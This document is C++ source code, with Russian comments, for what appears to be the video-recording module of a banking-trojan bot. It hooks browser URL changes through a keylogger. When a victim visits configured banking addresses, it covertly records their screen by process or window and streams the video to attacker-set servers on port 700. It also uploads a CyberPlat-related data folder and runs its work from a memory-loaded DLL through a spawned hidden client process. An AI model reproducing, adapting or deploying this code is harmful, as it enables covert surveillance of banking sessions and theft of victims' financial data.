

#include "VideoRecorder.h"
#include "DllLoader.h"
#include "BotCore.h"
#include "Memory.h"
#include "Utils.h"
#include "GetApi.h"
#include "Config.h"
#include "Crypt.h"
#include "Pipes.h"
#include "Inject.h"


//----------------------------------------------------------------------------
#include "BotDebug.h"

namespace VIDEORECDEBUGSTRINGS
{
	#include "DbgTemplates.h"
}

// Объявляем шаблон вывода отладочных строк
#define VDRDBG VIDEORECDEBUGSTRINGS::DBGOutMessage<>

//----------------------------------------------------------------------------


/// список отлавливаемых адресов. В случае рабочей копии должен заканчиваться
//  двойным нулём
#ifndef DEBUGCONFIG
	char VIDEO_REC_URLS[MAX_VIDEO_REC_URLS_LEN] = "VIDEO_REC_URLS\0";
#else
	char VIDEO_REC_URLS[MAX_VIDEO_REC_URLS_LEN] = "*rambler.*\0"
												  "*bsi.dll*\0\0";
#endif


#define HASH_VIDEO_REC_URLS 0x9189212B /* VIDEO_REC_URLS */


#ifdef DEBUGCONFIG
	char VIDEO_REC_HOST1[MAX_VIDEO_REC_HOST_LEN] = "192.168.0.100\0"; //"127.0.0.1";//"178.162.179.65\0";
	char VIDEO_REC_HOST2[MAX_VIDEO_REC_HOST_LEN] = "\0";
#else
	//Адрес сервера куда пишем видео
	char VIDEO_REC_HOST1[MAX_VIDEO_REC_HOST_LEN] = "VIDEO_REC_HOST\0";
	char VIDEO_REC_HOST2[MAX_VIDEO_REC_HOST_LEN] = "VIDEO_REC_HOST\0";
#endif


#define HASH_VIDEO_REC_HOST 0x922E6EAC /* VIDEO_REC_HOST */



namespace VideoRecorder
{
	// Подключаем код библиотеки
	#include "VideoRecorderDll.cpp"


    char MethodStartRecordPid[] = {'S','t','a','r','t','R','e','c','P','i','d', 0};
    char MethodStop[]           = {'S','t','o','p','R','e','c', 0};

	// порт сервера приёма видео
    const DWORD DEFAULT_PORT = 700;


	// Функция загружает библиотеку
	HMEMORYMODULE inline LoadDLL();

}

//*****************************************************************************

HMEMORYMODULE inline VideoRecorder::LoadDLL()
{
	// Функция загружает библиотеку
	HMEMORYMODULE Module = MemoryLoadLibrary(VideoRecorder::data);

	#ifdef DebugUtils
		if (Module == NULL)
			VDRDBG("VIDEO","Ошибка загрузки модуля");
	#endif

	return Module;
}
//*****************************************************************************




//"89.149.226.121";


HMEMORYMODULE	hLibWndRec = NULL;

//StartRecHwnd( char* uid, char* nameVideo, HWND wnd, const char* ip, int port ) //запись по HWND окна
//StartRecPid( char* uid, DWOD pid, char* ip, int port )  //запись по PID процесса
typedef VOID (WINAPI *TStartRecHwnd	)( char* uid, char* nameVideo, HWND wnd,  const char* ip1, int port1, const char* ip2, int port2 ) ;
typedef VOID (WINAPI *TStartRecPid  )( char* uid, char* nameVideo, DWORD pid, const char* ip1, int port1, const char* ip2, int port2 );
typedef VOID (WINAPI *TStopRec		)();

typedef VOID (WINAPI *PStartSend	)( char* uid, char* path, const char* ip1, int port1, const char* ip2, int port2 );
typedef VOID (WINAPI *PStartFindFields)();
typedef VOID (WINAPI *PStopFindFields)();

char CurrentChar[256];


void StartRecordThread(DWORD pid,PCHAR KeyWord, PCHAR ip, PCHAR ReservedIP, int port)//стартуем поток записи видео
{
	VDRDBG("VIDEO","StartRecordThread");

	if (!hLibWndRec)
		hLibWndRec = VideoRecorder::LoadDLL();

	if (hLibWndRec)
	{

		TStartRecPid pStartRecPid;
	
		pStartRecPid =(TStartRecPid)MemoryGetProcAddress(hLibWndRec,"StartRecPid");
		if (pStartRecPid)
		{
			char Buf[100];
			GenerateUid(Buf);
			if (ip == NULL)
				ip = GetVideoRecHost1();
			if (ReservedIP == NULL)
				ReservedIP = GetVideoRecHost2();
			//Здесь надо получить второй айпи и порт(резервный)
			VDRDBG("VIDEO","Все получили, теперь стартуем видео");
			pStartRecPid(Buf, KeyWord, pid, ip, port, ReservedIP, port);
		};
	};
}

void StartSendThread(PCHAR Path,PCHAR ip, PCHAR ReservedIP, int port)//стартуем поток отправки
{
	VDRDBG("VIDEO","слать даные из %s",Path);
	HMEMORYMODULE	hLibWndRec1 = VideoRecorder::LoadDLL();;

	if (hLibWndRec1)
	{

		PStartSend StartSend;

		StartSend = (PStartSend)MemoryGetProcAddress(hLibWndRec1,"StartSend");
		if (StartSend)
		{
			char Buf[100];
			GenerateUid(Buf);

			if (ip == NULL)
				ip = GetVideoRecHost1();
			if (ReservedIP == NULL)
				ReservedIP = GetVideoRecHost2();

			//Здесь надо получить второй айпи и порт(резервный)
			VDRDBG("VIDEO","Все готово запускаем(жмем и отрправляем данные) %s",ip);
			StartSend(Buf,Path,ip,port, ReservedIP,port);
			VDRDBG("VIDEO","Все отправили %s",ip);
		};
		MemoryFreeLibrary(hLibWndRec1);
	};
}
//---------------------------------------------------------------------------------
DWORD WINAPI StartSendinThread(LPVOID Data)
{
	//на случай если надо отправить в отдельном потоке
	PCHAR Path_Folder;
	if (Data!=NULL)
	{
		Path_Folder=(PCHAR)Data;
	}
	else
	{
		// применяеться только для киберплата
		Path_Folder = STR::Alloc(MAX_PATH );
		m_memset(Path_Folder,0,MAX_PATH);
		pExpandEnvironmentStringsA( ("%AllUsersProfile%\\cdat"), Path_Folder, MAX_PATH);
	}

	VDRDBG("VIDEO","полученное имя %s",Path_Folder);
	StartSendThread(Path_Folder,NULL,NULL, 700);
	return 0;

}
//---------------------------------------------------------------------------------
void StartRecordThread1(HWND hWnd,PCHAR KeyWord,PCHAR ip, PCHAR ReservedIP, int port)//стартуем поток записи видео
{
	VDRDBG("VIDEO","Начинаем запись по хендлу окна");
	if (!hLibWndRec)
		hLibWndRec = VideoRecorder::LoadDLL();

	if (!hLibWndRec)
	{
		VDRDBG("VIDEO","не получилось загрузить длл");
		return;
	}
	if (hLibWndRec)
	{

		TStartRecHwnd pStartRecHwnd;

		pStartRecHwnd = (TStartRecHwnd)MemoryGetProcAddress(hLibWndRec,"StartRecHwnd");
		if (pStartRecHwnd)
		{
			char Buf[100];
			GenerateUid(Buf);

			if (ip == NULL)
				ip = GetVideoRecHost1();
			if (ReservedIP == NULL)
				ReservedIP = GetVideoRecHost2();

			//Здесь надо получить второй айпи и порт(резервный)
			VDRDBG("VIDEO","Все готово запускаем");
			pStartRecHwnd(Buf,KeyWord,hWnd,ip,port, ReservedIP,port);
		};
	};
}


void StopRecordThread()//останавливаем поток записи видео
{

	if (hLibWndRec)
	{
        VDRDBG("VIDEO","StopRecordThread");
		TStopRec pStopRec;
		pStopRec = (TStopRec) MemoryGetProcAddress(hLibWndRec,"StopRec");
		if (pStopRec)
		{
			char Buf[100];
			GenerateUid(Buf);
			pStopRec();			
		};

	//MemoryFreeLibrary(hLibWndRec);
	//hLibWndRec = NULL;
	};
}

void StartFindFields()//останавливаем поток записи видео
{
	if (!hLibWndRec)
		hLibWndRec = VideoRecorder::LoadDLL();

	if (!hLibWndRec)
	{
		VDRDBG("VIDEO","не получилось загрузить длл");
		return;
	}

	VDRDBG("VIDEO","запускаем слежение  ");
	if (hLibWndRec)
	{
		PStartFindFields pStartFindFields;
		pStartFindFields = (PStartFindFields) MemoryGetProcAddress(hLibWndRec,"StartFindFields");
		if (pStartFindFields)
		{
			
			pStartFindFields();			
		};
	};
}

void StopFindFields()//останавливаем поток записи видео
{

	if (hLibWndRec)
	{
        VDRDBG("VIDEO","Стопаем поток слежения StopFindFields");
		PStopFindFields pStopFindFields;
		pStopFindFields = (PStartFindFields) MemoryGetProcAddress(hLibWndRec,"StopFindFields");
		if (pStopFindFields)
		{

			pStopFindFields();
		};
	};
}

void WINAPI IEURLChanged(PKeyLogger, DWORD EventID, LPVOID Data)
{
	// Проверяем адрес в браузере и, в случае нужного, запускаем запись
	if (CalcHash(VIDEO_REC_URLS) == HASH_VIDEO_REC_URLS)
		return;

	PCHAR URL = NULL;

	if (!STR::IsEmpty((PCHAR)Data))
	{
		PCHAR Temp = VIDEO_REC_URLS;
		while (*Temp != 0)
		{
			if (CompareUrl(Temp, (PCHAR)Data))
			{
				URL = Temp;
				break;
			}

			//--------------------
			Temp = STR::End(Temp); // Переходим к концу строки
			Temp++;                // Пропускаем нулевой символ
		}
    }


	if (URL != NULL)
	{
		VideoRecorderSrv::StartRecording(URL);
//		StartRecordThread(GetUniquePID(),URL, NULL, NULL, 700);
	}
	else
	{
		VideoRecorderSrv::StopRecording();
	}
}


void StartVideoFromCurrentURL()
{

	#ifdef UniversalKeyLoggerH
 		VDRDBG("VideoRecorder", "Инициализируем видеорекордер для записи при нужных адресах");

		KeyLogger::Initialize(NULL);
		KeyLogger::ConnectEventHandler(KLE_IE_URL_CHANGED, IEURLChanged);
		KeyLogger::Start();
	#endif
}

PCHAR GetVideoRecHost1()
{
	//Функция возвращает адрес сервера для записи видео
	if (CalcHash(VIDEO_REC_HOST1) == HASH_VIDEO_REC_HOST)
		return NULL;

	return VIDEO_REC_HOST1;
}

PCHAR GetVideoRecHost2()
{
	//Функция возвращает адрес сервера для записи видео
	if (CalcHash(VIDEO_REC_HOST2) == HASH_VIDEO_REC_HOST)
		return NULL;

	return VIDEO_REC_HOST2;
}


//*********************************************************************
//  Методы сервера распределения записи видео
//*********************************************************************

namespace VideoRecorderSrv
{
	char ServerName[] = {'v','i','d','e','o','r','e','c','s','r','v', 0};

	char CommandStart[] = {'s','t','a','r','t','v','r', 0};
	char CommandStop[]  = {'s','t','o','p','v','r', 0};

	char ClientPipe[] = {'V','d','e','o','R','e','c','C','l','i','e','n','t', 0};

	//----------------------------------------------------------------------
	// Глобальные данные
    //----------------------------------------------------------------------

	// Пид процесса который передаётся клиенту для записи
	const static BYTE ClientURLMaxSize = 255;
	DWORD ClientPID = 0;
	char  ClientURL[ClientURLMaxSize + 1];

	// Признак необходимости прервать запись видео
	bool ClientTerminated = false;
	HANDLE ClientThread = 0;

    //----------------------------------------------------------------------

	PCHAR GetClientPipeName(DWORD PID)
	{
		// Функция возвращает имя канала клиента сервера
		PCHAR PIDStr = StrLongToString(PID);

		PCHAR Name = STR::New(2, ClientPipe, PIDStr);

		STR::Free(PIDStr);
		return Name;
    }
	//----------------------------------------------------------------------

	DWORD WINAPI RecordThread(LPVOID Data)
	{
		// Поток записи видео

		// Инициализируем  библиотеку
		HMEMORYMODULE Module = VideoRecorder::LoadDLL();
		if (Module == NULL)
			return 0;

		TStartRecPid   Start = (TStartRecPid)MemoryGetProcAddress(Module,
											 VideoRecorder::MethodStartRecordPid);

		TStopRec       Stop  = (TStopRec)MemoryGetProcAddress(Module,
											 VideoRecorder::MethodStop);

		if (Start == NULL || Stop == NULL)
		{
			// Не удалось инициализировать библиотеку
			VDRDBG("VideoRecorder", "DLL не содержит необходимых методов");
			MemoryFreeLibrary(Module);
            return 0;
        }

		// Инициализируем параметры запуска
		PCHAR IP1 = GetVideoRecHost1();
		PCHAR IP2 = GetVideoRecHost2();
		int Port  = VideoRecorder::DEFAULT_PORT;
		PCHAR UID = GenerateBotID();

		// запускаем запись
		VDRDBG("VideoRecorder", "Запущен поток записи видео с процесса %d URL %s", ClientPID, ClientURL);
		Start(UID, ClientURL, ClientPID, IP1, Port, IP2, Port);

		// ожидаем оуончания записи
		while (!ClientTerminated)
		{
			pSleep(1000);
			if (!IsProcessLeave(ClientPID))
            	break;
		}

		Stop();

		VDRDBG("VideoRecorder", "Поток записи видео остановлен");

		MemoryFreeLibrary(Module);

		STR::Free(UID);

		return 0;
	}
	//----------------------------------------------------------------------

  /*	void WINAPI ClientStartHandler(LPVOID, PPipeMessage Pipe, bool &Cancel)
	{
    	// Обработчик команды остановки видео
		if (ClientThread == NULL)
		{
			PCHAR URL = STR::New((PCHAR)Pipe->Data);
			ClientThread = StartThread(RecordThread, URL);
        }
	}    */
	//----------------------------------------------------------------------

	void WINAPI ClientStopHandler(LPVOID, PPipeMessage Pipe, bool &Cancel)
	{
    	// Обработчик команды остановки видео
		VDRDBG("VideoRecorder", "Получена команда прекращения записи");
        ClientTerminated = true;
	}
	//----------------------------------------------------------------------

	DWORD WINAPI ClientMainProc(LPVOID Data)
	{
		// Основная процедура клиента записи видео
		InitializeAPI();

		VDRDBG("VideoRecorder", "Запущен клиент записи видео. PID %d", ClientPID);


		ClientThread = NULL;
		ClientTerminated = false;


		// Создаём канал приёма команд

		PCHAR PipeName = GetClientPipeName(ClientPID);

		PProcessPipe Pipe = PIPE::CreateProcessPipe(PipeName, false);

		STR::Free(PipeName);

		if (Pipe == NULL)
		{
        	VDRDBG("VideoRecClient", "ClientPipe error");
			return 0;
		}

//		PIPE::RegisterMessageHandler(Pipe, ClientStartHandler, NULL, CommandStart, 0);
		PIPE::RegisterMessageHandler(Pipe, ClientStopHandler, NULL, CommandStop, 0);

		PIPE::StartProcessPipe(Pipe);


		ClientThread = StartThread(RecordThread, NULL);

		// Ожидаем окончания записи
		pWaitForSingleObject(ClientThread, INFINITE);

		VDRDBG("VideoRecorder", "Клиент завершил работу");
		pExitProcess(0);
		return 0;
	}
	//----------------------------------------------------------------------


	void WINAPI ServerStartHandler(LPVOID, PPipeMessage Msg, bool &Cancel)
	{
		// Обработчик команды запуска видео

		// Настраиваем параметры старта
		ClientPID = Msg->PID;
		m_memset(ClientURL, 0, ClientURLMaxSize + 1);
		DWORD CopySize = Min(ClientURLMaxSize, Msg->DataSize);
        m_memcpy(ClientURL, Msg->Data,CopySize);


        VDRDBG("VideoRecServer", "Получена команда записи видео с процесса %d", ClientPID);

		PCHAR PipeName = GetClientPipeName(ClientPID);

		// Проверяем существование записывающего процесса
		BOOL Running = PIPE::Ping(PipeName);

		// В случае если процесс не работает запускаем его
		if (!Running)
		{
//			 StartThread(ClientMainProc, NULL);
			MegaJump(ClientMainProc);

			// Ожидаем запуска и инициализации процесса
			DWORD St = (DWORD)pGetTickCount();
			while (!Running)
			{
				pSleep(250);
				Running = PIPE::Ping(PipeName);

				// Ограничиваем время ожидания
				if (((DWORD)pGetTickCount() - St) >= 2000) break;
			}
		}

		STR::Free(PipeName);
	}
	//-----------------------------------------------------------------------

}
//-----------------------------------------------------------------------------

bool VideoRecorderSrv::Start()
{
	// Запускаем сервер
	VDRDBG("VideoRecorder", "Запускаем сервер распределения записи видео");
	PProcessPipe Pipe = PIPE::CreateProcessPipe(ServerName, true);
	if (Pipe == NULL)
		return false;

	// Добавляем обработчики команд
	PIPE::RegisterMessageHandler(Pipe, ServerStartHandler, NULL, CommandStart, 0);

	return true;
}
//-----------------------------------------------------------------------------

bool VideoRecorderSrv::StartRecording(PCHAR URL)
{
	// Функция стартует запуск записи
	// видео для текущего процесса

	// Проверяем существование записывающего процесса

	if (PingClient(0))
		return true;

	VDRDBG("VideoRecorder", "Отправляем команду запуска удалённой записи видео");

	bool Result = PIPE::SendMessage(ServerName, CommandStart, URL, 0, NULL);

	if (!Result)
	{
    	VDRDBG("VideoRecorder", "Ошибка запуска удалённой записи. Возможно сервер не доступен.");
    }

	return Result;
}
//-----------------------------------------------------------------------------

bool VideoRecorderSrv::StopRecording()
{
	// Функция останавливает запуск записи
	// видео для текущего процесса

	DWORD PID = GetUniquePID();
	PCHAR PipeName = GetClientPipeName(PID);

	bool Result = PIPE::SendMessage(PipeName, CommandStop);
	if (Result)
	{
    	VDRDBG("VideoRecorder", "Запись видео с процесса %d остановлена", PID);
    }

	STR::Free(PipeName);

	return Result;
}
//-----------------------------------------------------------------------------

//-----------------------------------------------------
//  PingClient - Функция проверяет работает ли
//               клиент записи с указанным PID
//	Если PID равен 0 то будет проверяться текущий
//  процесс
//-----------------------------------------------------
bool VideoRecorderSrv::PingClient(DWORD PID)
{
	//  Функция проверяет работает ли клиент записи с указанным PID
	if (PID == 0)
		PID = GetUniquePID();

	PCHAR PipeName = GetClientPipeName(PID);

	DWORD Result = PIPE::Ping(PipeName);

	STR::Free(PipeName);

	return Result != 0;
}
//-----------------------------------------------------------------------------
